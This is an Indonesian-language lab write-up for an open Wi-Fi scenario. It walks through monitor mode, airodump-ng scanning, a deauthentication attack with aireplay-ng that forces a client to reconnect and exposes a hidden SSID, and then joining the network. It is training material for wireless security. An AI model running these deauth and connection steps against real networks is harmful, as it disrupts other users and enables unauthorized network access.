# Writeup Wi-Fi OPN

Berikut ini adalah langkah-langkah untuk menyelesaikan lab Wi-Fi dengan skenario Wi-Fi OPN.

## Langkah-Langkah

#### 1. Lihat interface wireless:

```bash
iwconfig
```

#### 2. Aktifkan mode monitor:

```bash
sudo airmon-ng start wlan0
```

Nama interface akan berubah menjadi `wlan0mon`.

#### 3. Scan target:

```bash
sudo airodump-ng wlan0mon
```

<img src="https://github.com/fixploit03/lab-wifi/blob/main/img/opn1.png" width="1000"/>

Wi-Fi OPN ditandai dengan nilai `OPN` pada kolom `ENC`.

#### 4. Scan target dengan mengunci BSSID dan channel-nya:

```bash
sudo airodump-ng -d <bssid> -c <channel> wlan0mon
```

<img src="https://github.com/fixploit03/lab-wifi/blob/main/img/opn2.png" width="1000"/>

Mengunci `BSSID` bertujuan agar proses scanning hanya menampilkan data dari AP target. Sementara itu, mengunci `channel` dilakukan agar `airodump-ng` tidak berpindah (hopping) ke channel lain. Dengan demikian, proses scanning menjadi lebih fokus, sehingga `aireplay-ng` dapat membaca dan mengirim paket secara lebih akurat ke target yang dituju.

#### 5. Deauth client:

```bash
sudo aireplay-ng -0 10 -a <bssid> -c <mac_client> wlan0mon
```

<img src="https://github.com/fixploit03/lab-wifi/blob/main/img/opn3.png" width="1000"/>

Perintah di atas akan mengirimkan **10 paket deauthentication** kepada client yang ditargetkan berdasarkan MAC address-nya. Tujuannya adalah untuk memutus koneksi client dari AP dan memaksanya melakukan reconnect. Saat client terhubung kembali, `SSID` yang tersembunyi (hidden) dapat terungkap oleh `airodump-ng`.

#### 6. Pantau terminal `airodump-ng`:

<img src="https://github.com/fixploit03/lab-wifi/blob/main/img/opn4.png" width="1000"/>

Jika SSID berhasil diungkap, tekan `CTRL+C` untuk menghentikan `airodump-ng`.

#### 7. Terhubung ke jaringan:

Buat konfigurasi `wpa_supplicant`:

```bash
nano opn.conf
```

Isi dengan:

```bash
network={
    ssid="<ssid>"
    scan_ssid=1
    key_mgmt=NONE
}
```

Konek:

```bash
sudo wpa_supplicant -i wlan1 -B -c opn.conf
```

#### 8. Minta IP:

```bash
sudo dhclient -v wlan1
```

#### 9. Verifikasi:

Cek IP:

```bash
ip a s wlan1
```

Tes ping:

```bash
ping <gateway>
```

<img src="https://github.com/fixploit03/lab-wifi/blob/main/img/opn5.png" width="1000"/>

Jika perintah `ping` berhasil menerima balasan `reply` dari gateway, maka perangkat telah berhasil terhubung ke jaringan Wi-Fi target.
